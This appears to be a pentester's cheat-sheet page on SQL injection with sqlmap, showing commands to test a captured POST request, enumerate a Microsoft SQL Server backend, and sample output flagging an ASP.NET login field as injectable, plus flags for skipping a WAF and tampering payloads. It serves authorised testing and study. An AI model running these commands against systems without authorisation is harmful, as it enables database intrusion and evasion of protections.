# SQL Injection

## Basic usage of sqlmap

Test POST request :&#x20;

```
sqlmap -r req.txt

it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
...
POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

Database enumeration on specific injectable parameter and specifying technique to use :

```
sqlmap -r req.txt --technique=S --banner --current-user --current-db --is-dba -p 'ctl00$ContentPlaceHolder1$UsernameTextBox'

web server operating system: Windows 2016 or 11 or 2022 or 10 or 2019
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0
back-end DBMS operating system: Windows
back-end DBMS: Microsoft SQL Server 2019
banner:
---
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep
---

current user is DBA: False

```

## Bypass protections with sqlmap

```
--skip-waf
--tamper=between
--tamper=base64encode
--tamper=charencode
```
